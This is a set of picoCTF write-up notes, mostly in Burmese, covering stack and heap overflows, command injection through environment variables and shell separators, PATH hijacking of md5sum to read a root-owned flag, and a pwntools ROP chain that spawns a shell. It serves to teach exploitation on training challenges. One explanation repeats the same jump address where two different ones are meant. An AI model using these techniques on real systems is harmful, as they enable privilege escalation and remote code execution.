
### Input Injection 1

#input_injection

```
└─$ pwn checksec vuln                              
[*] '/home/Jackfruit/cate/learn/binary/stack/picoCTF/inputInjection/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```


```c

undefined8 main(void)

{
   size_t sVar1;
   char local_d8 [208];
   
   puts("What is your name?");
   FUN_00401100(stdout);
   fgets(local_d8,200,stdin);
   sVar1 = strcspn(local_d8,"\n");
   local_d8[sVar1] = '\0';
   fun(local_d8,"uname");
   return 0;
}
```


```c

void fun(char *param_1,char *param_2)

{
   char local_1c [10];
   char local_12 [10];
   
   strcpy(local_12,param_2);
   strcpy(local_1c,param_1);
   printf("Goodbye, %s!\n",local_1c);
   FUN_00401100(stdout);
   system(local_12);
   return;
}

```

	user input ကြ အများကြီးယူပြီး (can buffer overflow) fun ထဲမှာကြ 10 byte ဘဲရှိတဲ့ local_1cထဲ copy ကူးထားတယ် system() ခေါ်ထားတယ် variable အတွက် default ဆို uname ပါပေါ့ ဆိုတော့ 10bytes + "cat flag.txt\n" 


---
## Input Injection 2
#input_injection


```
└─$ pwn checksec vuln
[*] '/home/Jackfruit/cate/learn/binary/stack/picoCTF/inputInjection2/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
                           
```

```c

undefined8 main(void)

{
  void *pvVar1;
  char *__command;
  
  pvVar1 = malloc(0x1c);
  __command = (char *)malloc(0x1c);
  printf("username at %p\n",pvVar1);
  fflush(stdout);
  printf("shell at %p\n",__command);
  fflush(stdout);
  builtin_strncpy(__command,"/bin/pwd",9);
  printf("Enter username: ");
  fflush(stdout);
  FUN_004010c0(&DAT_00402032,pvVar1);
  printf("Hello, %s. Your shell is %s.\n",pvVar1,__command);
  system(__command);
  fflush(stdout);
  return 0;
}


```

	heap ပေါ်မှာ နေရာနှစ်ခုယူတယ် တစ်ခုကို username ထည့်မယ် တစ်ခုကို ။ run မယ် user name ကို heap overflow ပြီး နောက်တစ်ခုပေါ်overflowမယ်  FUN_004010c0(&DAT_00402032,pvVar1);မှာ scanf ကိုသုံးထားတယ် space တွေထည့်လို့မရ ဆိုတော့ cat<flag.txt or cat$(ls) နဲ့ bypassမယ်


---

## Hash only 1

#hash

sshနဲ့ connect လုပ်လိုက်ရင်

```
ctf-player@pico-chall$ ls
flaghasher
ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

2027d8854463a278ea02a925cf352b61  /root/flag.txt

```

	md5sum နဲ့ root/flag.txt ရဲ့ md5hash ကို ထုတ်ပေးတယ် ဆိုတော့ root/flag.txt ကို permission လည်းမရှိဘူးဆိုတော့ ဖတ်လို့မရ md5sum ကို‌ ခေါ်တယ်ဆိုတော့ md5sum ဆိုပြီး binary file တစ်ခုတည်ဆောက်ပြီး environment path ကို အဲ file ကိုရှာခိုင်းရင်ရော ?

```bash
echo '#!/bin/sh' > md5sum  
echo 'cat /root/flag.txt' >> md5sum  
chmod +x md5sum  
export PATH=.:$PATH  
./flaghasher
```

---

## Hash only 2
#hash

```bash
ctf-player@pico-chall$ echo '#!/bin/sh' > md5sum
-rbash: md5sum: restricted: cannot redirect output
ctf-player@pico-chall$ sh
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ echo '#!/bin/sh' > md5sum
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ 

```

	ငါတို့ကို restrict command ပေးထားတယ် ဆိုတော့ sh နဲ့ shell ပြောင်းကြည့်လိုက်တော့ runလို့ရသွားတယ် hash only 1 အတိုင်းဆက်လုပ်မယ်

---

## VNE

	ထုံးစံအတိုင် ssh connect လုပ်မယ် သူပေးထာတဲ့ bin run တဲ့အချိန်မှာ

```
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set

```

	SECRET_DIR ဆိုတော့ directory တစ်ခု env var မှာထည့်မယ်

```
ctf-player@pico-chall$ export SECRET_DIR="/root"
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
ctf-player@p
```

	သူက ls သုံးသွားတာ။ cat နဲ့ဖတ်ချင်တယ်ဆိုတော့ & seprator သုံးပြီး command နှစ်ခုသုံးတဲ့သဘောလုပ်မယ်

```bash
export SECRET_DIR="/&cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of /&cat /root/flag.txt as root: 
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoCTF{Power_t0_man!pul4t3_3nv_3f693329}ctf-player@pico-chall$ Connection to saturn.picoctf.net closed by remote host
```


---

## Two Sum

	ဒီမှာက wrap around ကိုအသုံးချတဲ့ပုံစံဖြစ်တယ်
	wrap around  က ဘာလဲဆို နာရီလိုပါဘဲ 12 ကျော်သွားရင် 1 က ပြန်စတယ်
	max ကျော်သွားရင် min က min အောက်လျော့သွားရင် max ကပြန်စပြီးလျော့
	wrap arround က byte တွေဘယ်လောက်ယူတာလဲဆိုအပေါ် range ကွဲပြားပါယတယ်
	အဲဒါအပြင် singned (+ or -) ကြရင် - ဘက်သို့wrap arround ဖြစ်ပြီး unsigned (+)ကြရင် 0ကနေစပြီး wrap arround ဖြစ်ပါတယ်



### C Language မှာ:

| Data Type | Size (bits) | Range                           | Calculation   |
| --------- | ----------- | ------------------------------- | ------------- |
| char      | 8           | -128 to 127                     | -2⁷ to 2⁷-1   |
| short     | 16          | -32,768 to 32,767               | -2¹⁵ to 2¹⁵-1 |
| int       | 32          | -2,147,483,648 to 2,147,483,647 | -2³¹ to 2³¹-1 |
| long      | 32 or 64    | System dependent                |               |
| long long | 64          | -9.22×10¹⁸ to 9.22×10¹⁸         | -2⁶³ to 2⁶³-1 |

### Unsigned Integers (အနှုတ်မပါ):

| Data Type      | Size | Range              | Calculation |
| -------------- | ---- | ------------------ | ----------- |
| unsigned char  | 8    | 0 to 255           | 0 to 2⁸-1   |
| unsigned short | 16   | 0 to 65,535        | 0 to 2¹⁶-1  |
| unsigned int   | 32   | 0 to 4,294,967,295 | 0 to 2³²-1  |
	ဆိုတော့ input ကို 2000000000 နှစ်ခုပေးလိုက် နှစ်ခုပေါင်းလဒ်က - နဲ့ညီလိမ့်မယ်

---

##  x-sixty-what

	ရိုးရိုး buffer overflow ပြီး return address ကို flag function နဲ့ overwrite but 

```
   0x0000000000401236 <+0>:     endbr64                                      
   0x000000000040123a <+4>:     push   rbp                                   
   0x0000000000401236 <+5>:     mov    rbp,rsp      
```

	0x0000000000401236 ဒီကိုမခုန်ဘဲနဲ့ 0x0000000000401236 ဒီကိုခုန်ရမယ် ဘာလို့ဆို push instruction က stack pointer (rsp) ကို 8 bytes လျှော့ပေးလိုက်တယ်။ ပြဿနာက ကိုယ့် payload ပို့လိုက်တဲ့အခါ stack pointer က 16-byte boundary မှာ မရှိတော့ဘူး။ Stack က misaligned ဖြစ်သွားပြီး MOVAPS (Move Aligned Packed Single-Precision) instructions တွေ ရှိတဲ့အခါ segmentation fault ဖြစ်သွားတယ်။
	ဆိုတော့ 0x0000000000401236 ဒီကိုခုန်ရမယ်

---

## What's your input

	python 2.7 မှာ input() ကို eval() လိုမျိုးသုံးတယ် အဲဒါကိုအသုံးချသွားတာ

---


## Guessing Game 1

```bash
explain this, └─$ file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=670139b05b438fbd512de3e3a3bf2715f295cbbc, not stripped
```

```c
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/guessingGame1/vuln
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No

```


	 ဒီမှာက  statically linked ဖြစ်နေတယ် ဆိုလိုတာက program ထဲမှာ လိုအပ်တဲ့ libraries တွေအားလုံးကို program ထဲမှာပဲထည့်သွင်းထားတာပါ။ Dynamic linking မဟုတ်တဲ့အတွက် အခြား system libraries တွေမလိုအပ်ဘူး
	 ဆိုတော့  static ဖြစ်လို ROP gadget တွေရှာရလွယ်မယ် 
	 no stripped ဖြစ်လို့ function name တွေမြင်ရမယ်

	ဒီမှာ vuln တစ်ခုတွေ့တယ် random တောင်းပြီး user input နဲ့စစ်တယ် ဒါမဲ့ random functionက ဘာလုပ်လဲဆို တစ်ခါလာတိုင်း random လုပ်မယ့် no တွေကတူနေမယ် list တစ်ကို random funciton ခေါ်တိုင်း index အလိုက် output ထုတ်သလိုမျိူး ဆိုတော့ ငါတို့ ခန့်မှန်းလို့ရတယ်  
	random function ကို seed ပေးလိုက်ရင်တော့ ငါတို့ခန့်မှန်းလို့မရတော့ဘူး seed ဆိုတာက အချိန်အလိုက်ပြောင်းလဲပေးတာကို ပြောတာဖြစ်တယ်

``` c
//seedဘယ်လိုသုံးတာလဲဆိုတာ ဥပမာ
int main() {
    // လက်ရှိအချိန်ကို seed အဖြစ်သုံးမယ်
    srand(time(NULL));
    
    printf("Testing rand() WITH seed (current time):\n");
    printf("Run this program multiple times:\n\n");
    
    for(int i = 1; i <= 5; i++) {
        int random_num = rand() % 100 + 1;  // 1-100
        printf("Random number %d: %d\n", i, random_num);
    }
    
    return 0;
}
```

	နောက်တစ်ချက်က overflow လို့ရအောင် လုပ်ပေးထားတာတွေ့မယ်
```c

void win(void)

{
  char local_78 [112];
  
  printf("New winner!\nName? ");
  fgets(local_78,0x168,(FILE *)stdin);
  printf("Congrats %s\n\n",local_78);
  return;
}
```

	နောက်တစ်ချက်သိရမှာက ဒီကောင်က libc မလိုဘူး လိုအပ်တဲ့ funcitonတွေပါတဲ့ အတွက် CPU instruction ပေးမယ် syscall instruction ကလည်း binary ထဲပါလာမယ်
	ဆိုတော့ buffer over flow read rop gadget သုံးမယ် လိုအပ်တဲ့ argument register တွေသုံးမယ် 
	/bin/sh/0x00  ဆိုတဲ့ stringကို bss ထဲထည့်မယ်
	 /bin/sh/0x00 string ဆိုတော့ null terminator ပါရမယ် 
	 ပြီးရင် main သုံးပြီး buffer over flow မယ် syscall rop gadget ကို သုံးပြီး exec function ကို createလုပ်မယ်
	argument တွေထည့်မယ် bss  address ပေးပြီး ဒီကောင် /bin/sh/0x00 ကို execv လုပ်စေမယ် shell ရမယ်


	bss ကို commandline နဲ့ရှာလို့ရသလို python elfနဲ့လည်းရှာလို့ရ
```c
                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/picoCTF/guessingGame1]
└─$ readelf -S ./vuln | grep bss
  [15] .tbss             NOBITS           00000000006b7140  000b7140
  [26] .bss              NOBITS           00000000006bc3a0  000bc398

```


```python
from pwn import *

e = ELF("./vuln")
p = process(e.path)
#p = remote("shape-facility.picoctf.net", 51698)
read = e.symbols['read']
syscall = p64(0x000000000040138c)
randomm = [84,87]

main = p64(0x0000000000400c9c)
pop_rax = p64(0x00000000004005af)
pop_rdi = p64(0x00000000004006a6)
pop_rsi = p64(0x0000000000410b93)
pop_rdx = p64(0x0000000000410602)
bss = p64(e.bss())

payload = b'\x90'*120
payload += pop_rdi
payload += p64(0)
payload += pop_rsi
payload += bss
payload += pop_rdx
payload += p64(9)
payload += p64(read)
payload += main



p.recvline(b"What number would you like to guess?")
p.sendline(str(randomm[0]).encode())
p.recvuntil(b"Name? ")
p.sendline(payload)
p.sendline(b"/bin/sh\x00")
input("Just Enter to exploit")
p.recvline(b"What number would you like to guess?")

payload = b'\x90'*120
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += bss
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall


p.recvline(b"What number would you like to guess?")
p.sendline(str(randomm[1]).encode())
p.recvuntil(b"Name? ")
p.sendline(payload)
p.interactive()
```



---



#### Echo Escape 1
```
File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/echo_escape1/vuln
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No

```


ရိုးရိုး buffer overflow challenge လေးပါဘဲ

```python 

from pwn import *
r = remote("mysterious-sea.picoctf.net",60382)
payload = b"A" * 40 + p64(0x0000000000401256)

r.recvuntil(b"Please enter your name: ")
r.sendline(payload)
r.interactive()

```

#### echo_escape2

```
File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/echo_escape2/vuln
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No

```

တူတူ ဘဲ 32 ဖြစ်သွားတာဘဲ

```python
from pwn import *

r = remote("dolphin-cove.picoctf.net",62577)

payload = b"A" * 44 + p32(0x08049276)

  

r.recvuntil(b"Enter the secret key: ")

r.sendline(payload)

r.interactive()
```



 